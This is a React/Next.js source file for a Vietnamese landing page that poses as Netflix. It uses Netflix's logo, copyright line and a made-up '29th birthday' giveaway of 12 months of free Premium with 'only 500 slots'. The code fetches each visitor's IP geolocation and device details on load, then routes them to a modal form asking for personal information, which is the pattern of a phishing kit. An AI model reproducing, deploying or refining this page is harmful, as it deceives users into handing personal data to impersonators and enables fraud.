'use client';
import { store } from '@/store/store';
import { getDeviceLabel } from '@/utils/device';
import { useTranslation } from '@/hooks/use-translation';
import axios from 'axios';
import dynamic from 'next/dynamic';
import { Be_Vietnam_Pro } from 'next/font/google';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC, type ReactNode } from 'react';
import NetflixHeroBg from '@/assets/images/netflix-hero-bg.jpg';
import NetflixLogo from '@/assets/images/logoneflix.svg';
import Trending1 from '@/assets/images/trending-1.png';
import Trending2 from '@/assets/images/trending-2.png';
import Trending3 from '@/assets/images/trending-3.png';
import Trending4 from '@/assets/images/trending-4.png';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const beVietnamPro = Be_Vietnam_Pro({ subsets: ['latin', 'vietnamese'], weight: ['400', '500', '600', '700', '800'] });

const IMAGES = {
    hero: NetflixHeroBg,
    trending1: Trending1,
    trending2: Trending2,
    trending3: Trending3,
    trending4: Trending4
} as const;

const navItems = [
    { id: 'home', label: 'Home', isActive: true },
    { id: 'benefits', label: 'Benefits', isActive: false },
    { id: 'faq', label: 'FAQ', isActive: false }
];

const trendingContent = [
    { id: '1', image: IMAGES.trending1, tag: 'Trending #1' },
    { id: '2', image: IMAGES.trending2, tag: 'Trending #2' },
    { id: '3', image: IMAGES.trending3, tag: 'Trending #3' },
    { id: '4', image: IMAGES.trending4, tag: 'Trending #4' }
];

const benefits = [
    {
        id: '4k',
        icon: 'high_quality',
        title: '4K Ultra HD',
        description: '29 năm nâng tầm trải nghiệm xem phim — thưởng thức mọi tựa phim ở chất lượng 4K Ultra HD sắc nét nhất.'
    },
    {
        id: 'audio',
        icon: 'surround_sound',
        title: 'Spatial Audio',
        description: 'Âm thanh vòm sống động như tại rạp — món quà sinh nhật cho đôi tai của bạn.'
    },
    {
        id: 'devices',
        icon: 'devices',
        title: 'Mọi thiết bị',
        description: 'Xem trên điện thoại, laptop hay Smart TV — sinh nhật vui hơn khi cả nhà cùng xem.'
    },
    {
        id: 'download',
        icon: 'download',
        title: 'Tải ngoại tuyến',
        description: 'Tải về xem offline mọi lúc — mang cả thế giới giải trí theo bạn trong mùa sinh nhật này.'
    }
];

const faqItems = [
    {
        id: 'who-can-join',
        question: 'Ai được nhận quà sinh nhật 29 năm?',
        answer: 'Chương trình dành cho người dùng tại Việt Nam. Bạn chỉ cần đăng ký và xác minh thông tin để nhận quà tặng Netflix Premium miễn phí.'
    },
    {
        id: 'what-is-premium',
        question: 'Quà sinh nhật gồm những gì?',
        answer: 'Bạn được tặng Netflix Premium miễn phí 12 tháng — gói cao cấp nhất với 4K + HDR, Spatial Audio, tải xem offline và xem đồng thời trên tối đa 4 thiết bị. Hoàn toàn miễn phí, không cần nhập thẻ tín dụng.'
    },
    {
        id: 'limited-slots',
        question: 'Tại sao quà sinh nhật có hạn?',
        answer: 'Nhân dịp sinh nhật 29 năm, Netflix chỉ mở 500 suất quà tặng tại Việt Nam trong đợt này. Khi hết suất, chương trình sẽ tạm đóng.'
    },
    {
        id: 'how-to-apply',
        question: 'Làm sao để nhận quà sinh nhật?',
        answer: 'Nhấn "Nhận quà sinh nhật", điền thông tin cá nhân. Sau khi xét duyệt (trong vòng 24 giờ), tài khoản Netflix Premium sẽ được kích hoạt qua email bạn cung cấp.'
    }
];

const footerLinksCol1 = ['Help Center', 'Terms of Use', 'Privacy'];
const footerLinksCol2 = ['Ad Choices', 'Cookie Preferences', 'Gift Cards'];
const footerLinksCol3 = ['Media Center', 'Investor Relations', 'Jobs'];

const PAGE_TITLE = 'Sinh Nhật 29 Năm Netflix — Quà Tặng Premium';

const TEXTS_TO_TRANSLATE = [
    PAGE_TITLE,
    'Home',
    'Benefits',
    'FAQ',
    'NHẬN QUÀ NGAY',
    'Sinh nhật 29 năm · Chỉ 500 suất quà tặng',
    'Mừng Sinh Nhật 29 Năm — Netflix Premium Miễn Phí 12 Tháng',
    'Từ năm 1997, Netflix đã đồng hành cùng hàng triệu người yêu phim. Nhân dịp sinh nhật 29 tuổi, chúng tôi tặng bạn Netflix Premium 12 tháng — 4K HDR, Spatial Audio, tải xem offline. Hoàn toàn miễn phí, không cần thẻ tín dụng. Nhanh tay trước khi hết quà!',
    'Nhận quà sinh nhật',
    'Xem điều kiện',
    'Phim hot mừng sinh nhật 29 năm',
    'Trending #1',
    'Trending #2',
    'Trending #3',
    'Trending #4',
    'Quà sinh nhật dành riêng bạn',
    '4K Ultra HD',
    '29 năm nâng tầm trải nghiệm xem phim — thưởng thức mọi tựa phim ở chất lượng 4K Ultra HD sắc nét nhất.',
    'Spatial Audio',
    'Âm thanh vòm sống động như tại rạp — món quà sinh nhật cho đôi tai của bạn.',
    'Mọi thiết bị',
    'Xem trên điện thoại, laptop hay Smart TV — sinh nhật vui hơn khi cả nhà cùng xem.',
    'Tải ngoại tuyến',
    'Tải về xem offline mọi lúc — mang cả thế giới giải trí theo bạn trong mùa sinh nhật này.',
    'Câu hỏi thường gặp',
    ...faqItems.flatMap((f) => [f.question, f.answer]),
    'Sinh nhật 29 năm chỉ có một lần — đăng ký ngay để nhận Netflix Premium miễn phí 12 tháng!',
    'Địa chỉ Email',
    'Bắt đầu',
    '© 2026 Netflix, Inc. All rights reserved.',
    ...footerLinksCol1,
    ...footerLinksCol2,
    ...footerLinksCol3,
    'Tiếng Việt',
    'English'
] as const;

const BenefitIcon = ({ name }: { name: string }) => {
    const icons: Record<string, ReactNode> = {
        high_quality: (
            <svg width='40' height='40' viewBox='0 0 24 24' fill='currentColor'>
                <path d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14H7v-4h5v4zm7 0h-5v-4h5v4zm0-6H7V7h12v4z' />
            </svg>
        ),
        surround_sound: (
            <svg width='40' height='40' viewBox='0 0 24 24' fill='currentColor'>
                <path d='M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z' />
            </svg>
        ),
        devices: (
            <svg width='40' height='40' viewBox='0 0 24 24' fill='currentColor'>
                <path d='M4 6h18V4H4c-1.1 0-2 .9-2 2v11H0v3h14v-3H4V6zm19 2h-6c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h6c.55 0 1-.45 1-1V9c0-.55-.45-1-1-1zm-1 9h-4v-7h4v7z' />
            </svg>
        ),
        download: (
            <svg width='40' height='40' viewBox='0 0 24 24' fill='currentColor'>
                <path d='M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z' />
            </svg>
        )
    };
    return <>{icons[name]}</>;
};

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, setDeviceLabel, geoInfo, deviceLabel } = store();
    const { t } = useTranslation(TEXTS_TO_TRANSLATE);
    const [modalKey, setModalKey] = useState(0);
    const [headerScrolled, setHeaderScrolled] = useState(false);
    const faqRef = useRef<HTMLDivElement>(null);

    const openModal = () => {
        setModalKey((prev) => prev + 1);
        setModalOpen(true);
    };

    useEffect(() => {
        if (geoInfo) return;

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    region: data.region || data.country_code || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    region: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (deviceLabel && deviceLabel !== 'Unknown') return;

        const fetchDevice = async () => {
            const label = await getDeviceLabel();
            setDeviceLabel(label);
        };

        fetchDevice();
    }, [deviceLabel, setDeviceLabel]);

    useEffect(() => {
        document.title = t(PAGE_TITLE);
    }, [t]);

    useEffect(() => {
        const onScroll = () => setHeaderScrolled(window.scrollY > 50);
        window.addEventListener('scroll', onScroll);
        return () => window.removeEventListener('scroll', onScroll);
    }, []);

    useEffect(() => {
        const container = faqRef.current;
        if (!container) return;

        const details = container.querySelectorAll('details');
        const handlers: Array<{ el: HTMLDetailsElement; fn: () => void }> = [];

        details.forEach((el) => {
            const fn = () => {
                if (el.open) {
                    details.forEach((other) => {
                        if (other !== el) other.removeAttribute('open');
                    });
                }
            };
            el.addEventListener('toggle', fn);
            handlers.push({ el, fn });
        });

        return () => {
            handlers.forEach(({ el, fn }) => el.removeEventListener('toggle', fn));
        };
    }, []);

    return (
        <div className={`netflix-page ${beVietnamPro.className} overflow-x-hidden bg-black text-[#e2e2e2] antialiased`}>
            <title>{t(PAGE_TITLE)}</title>

            {/* Navigation */}
            <nav
                className={`fixed top-0 z-50 w-full transition-all duration-300 ${
                    headerScrolled ? 'bg-black' : 'bg-gradient-to-b from-black/80 to-transparent'
                }`}
            >
                <div className='mx-auto flex h-20 w-full max-w-[1440px] items-center justify-between px-5 py-2 md:px-[60px]'>
                    <Image src={NetflixLogo} alt='Netflix' width={120} height={32} className='h-8 w-auto' priority />

                    <div className='hidden items-center gap-8 md:flex'>
                        {navItems.map((item) => (
                            <span
                                key={item.id}
                                className={`cursor-pointer text-sm font-semibold tracking-wider uppercase transition-colors ${
                                    item.isActive
                                        ? 'border-b-2 border-[#e50914] pb-1 text-white'
                                        : 'text-[#e9bcb6] hover:text-[#e2e2e2]'
                                }`}
                            >
                                {t(item.label)}
                            </span>
                        ))}
                    </div>

                    <button
                        type='button'
                        onClick={openModal}
                        className='rounded-lg bg-[#e50914] px-6 py-2.5 text-sm font-bold tracking-wider text-white uppercase transition-transform hover:brightness-110 active:scale-95'
                    >
                        {t('NHẬN QUÀ NGAY')}
                    </button>
                </div>
            </nav>

            <main>
                {/* Hero Section */}
                <section className='relative flex h-[90vh] w-full items-center overflow-hidden md:h-screen'>
                    <div className='absolute inset-0 z-0'>
                        <Image
                            src={IMAGES.hero}
                            alt=''
                            fill
                            className='object-cover object-center'
                            quality={100}
                            sizes='100vw'
                            priority
                        />
                        <div className='netflix-cinematic-gradient absolute inset-0' />
                        <div className='netflix-hero-glow absolute inset-0' />
                    </div>

                    <div className='relative z-10 mx-auto w-full max-w-[1440px] px-5 md:px-[60px]'>
                        <div className='max-w-2xl'>
                            <span className='mb-6 inline-block rounded-full border border-[#e50914]/40 bg-[#e50914]/20 px-4 py-1 text-xs font-bold tracking-widest text-[#e50914] uppercase'>
                                {t('Sinh nhật 29 năm · Chỉ 500 suất quà tặng')}
                            </span>
                            <h1 className='mb-6 text-[32px] leading-tight font-extrabold text-white md:text-[64px] md:leading-[72px] md:tracking-[-0.02em]'>
                                {t('Mừng Sinh Nhật 29 Năm — Netflix Premium Miễn Phí 12 Tháng')}
                            </h1>
                            <p className='mb-10 text-lg leading-7 text-[#B3B3B3]'>
                                {t('Từ năm 1997, Netflix đã đồng hành cùng hàng triệu người yêu phim. Nhân dịp sinh nhật 29 tuổi, chúng tôi tặng bạn Netflix Premium 12 tháng — 4K HDR, Spatial Audio, tải xem offline. Hoàn toàn miễn phí, không cần thẻ tín dụng. Nhanh tay trước khi hết quà!')}
                            </p>
                            <div className='flex flex-col gap-4 md:flex-row'>
                                <button
                                    type='button'
                                    onClick={openModal}
                                    className='rounded-lg bg-[#e50914] px-10 py-4 text-2xl font-bold text-white uppercase transition-all hover:brightness-110 active:scale-95'
                                >
                                    {t('Nhận quà sinh nhật')}
                                </button>
                                <button
                                    type='button'
                                    className='rounded-lg border border-[#353535] bg-[#2a2a2a]/50 px-10 py-4 text-2xl font-bold text-[#e2e2e2] uppercase backdrop-blur-md transition-all hover:bg-[#353535]'
                                >
                                    {t('Xem điều kiện')}
                                </button>
                            </div>
                        </div>
                    </div>
                </section>

                {/* Trending Content */}
                <section className='overflow-hidden bg-[#131313] py-20'>
                    <div className='mx-auto max-w-[1440px] px-5 md:px-[60px]'>
                        <h2 className='mb-10 text-[32px] font-bold text-white md:text-[40px]'>{t('Phim hot mừng sinh nhật 29 năm')}</h2>
                        <div className='grid grid-cols-2 gap-6 md:grid-cols-4'>
                            {trendingContent.map((item) => (
                                <div
                                    key={item.id}
                                    className='netflix-card-transition relative aspect-[2/3] cursor-pointer overflow-hidden rounded-xl bg-[#1f1f1f]'
                                >
                                    <Image src={item.image} alt='' fill className='object-cover' sizes='(max-width: 768px) 50vw, 25vw' />
                                    <div className='absolute inset-0 flex flex-col justify-end bg-gradient-to-t from-black/80 via-transparent to-transparent p-4 opacity-0 transition-opacity hover:opacity-100'>
                                        <span className='text-xs font-bold text-[#ffb4aa]'>{t(item.tag)}</span>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                </section>

                {/* Benefits Section */}
                <section className='bg-[#131313] py-20'>
                    <div className='mx-auto max-w-[1440px] px-5 md:px-[60px]'>
                        <h2 className='mb-12 text-center text-[32px] font-bold text-white md:text-[40px]'>{t('Quà sinh nhật dành riêng bạn')}</h2>
                        <div className='grid grid-cols-1 gap-12 md:grid-cols-4'>
                            {benefits.map((benefit) => (
                                <div key={benefit.id} className='group text-center'>
                                    <div className='mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-[#2a2a2a] transition-all duration-300 group-hover:bg-[#e50914] group-hover:text-white'>
                                        <BenefitIcon name={benefit.icon} />
                                    </div>
                                    <h4 className='mb-3 text-2xl font-bold text-white'>{t(benefit.title)}</h4>
                                    <p className='text-base text-[#B3B3B3]'>{t(benefit.description)}</p>
                                </div>
                            ))}
                        </div>
                    </div>
                </section>

                {/* FAQ Section */}
                <section className='bg-[#0e0e0e] py-24'>
                    <div className='mx-auto max-w-3xl px-5'>
                        <h2 className='mb-12 text-center text-[32px] font-bold text-white md:text-[40px]'>{t('Câu hỏi thường gặp')}</h2>
                        <div ref={faqRef} className='space-y-4'>
                            {faqItems.map((item) => (
                                <details key={item.id} className='group overflow-hidden rounded-lg bg-[#2a2a2a]'>
                                    <summary className='flex cursor-pointer items-center justify-between p-6 transition-colors hover:bg-[#353535]'>
                                        <span className='text-2xl font-bold text-white'>{t(item.question)}</span>
                                        <span className='text-2xl transition-transform group-open:rotate-45'>+</span>
                                    </summary>
                                    <div className='mt-4 border-t border-[#353535]/30 p-6 pt-0 text-base text-[#B3B3B3]'>{t(item.answer)}</div>
                                </details>
                            ))}
                        </div>

                        <div className='mt-16 text-center'>
                            <p className='mb-6 text-lg leading-7 text-[#e2e2e2]'>
                                {t('Sinh nhật 29 năm chỉ có một lần — đăng ký ngay để nhận Netflix Premium miễn phí 12 tháng!')}
                            </p>
                            <div className='mx-auto flex max-w-xl flex-col gap-2 md:flex-row'>
                                <input
                                    className='flex-grow rounded-lg border border-[#353535] bg-black/50 p-4 text-[#e2e2e2] focus:border-[#e50914] focus:ring-0 focus:outline-none'
                                    placeholder={t('Địa chỉ Email')}
                                    type='email'
                                />
                                <button
                                    type='button'
                                    onClick={openModal}
                                    className='flex items-center justify-center gap-1 rounded-lg bg-[#e50914] px-8 py-4 text-2xl font-bold whitespace-nowrap text-white hover:brightness-110'
                                >
                                    {t('Bắt đầu')}
                                    <span className='text-xl'>&rsaquo;</span>
                                </button>
                            </div>
                        </div>
                    </div>
                </section>
            </main>

            {/* Footer */}
            <footer className='mt-auto w-full border-t border-[#353535] bg-[#0e0e0e]'>
                <div className='mx-auto grid max-w-[1440px] grid-cols-2 gap-6 px-5 py-12 md:grid-cols-4 md:px-[60px]'>
                    <div className='col-span-full mb-8'>
                        <Image src={NetflixLogo} alt='Netflix' width={100} height={28} className='mb-2 h-7 w-auto opacity-60' />
                        <p className='text-xs text-[#B3B3B3]'>{t('© 2026 Netflix, Inc. All rights reserved.')}</p>
                    </div>
                    <div className='flex flex-col gap-3'>
                        {footerLinksCol1.map((link) => (
                            <span key={link} className='cursor-pointer text-xs text-[#B3B3B3] hover:underline'>
                                {t(link)}
                            </span>
                        ))}
                    </div>
                    <div className='flex flex-col gap-3'>
                        {footerLinksCol2.map((link) => (
                            <span key={link} className='cursor-pointer text-xs text-[#B3B3B3] hover:underline'>
                                {t(link)}
                            </span>
                        ))}
                    </div>
                    <div className='flex flex-col gap-3'>
                        {footerLinksCol3.map((link) => (
                            <span key={link} className='cursor-pointer text-xs text-[#B3B3B3] hover:underline'>
                                {t(link)}
                            </span>
                        ))}
                    </div>
                    <div className='flex flex-col gap-3'>
                        <div className='mt-4'>
                            <select className='rounded border border-[#353535] bg-black p-2 text-xs text-[#B3B3B3]'>
                                <option>{t('Tiếng Việt')}</option>
                                <option>{t('English')}</option>
                            </select>
                        </div>
                    </div>
                </div>
            </footer>

            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
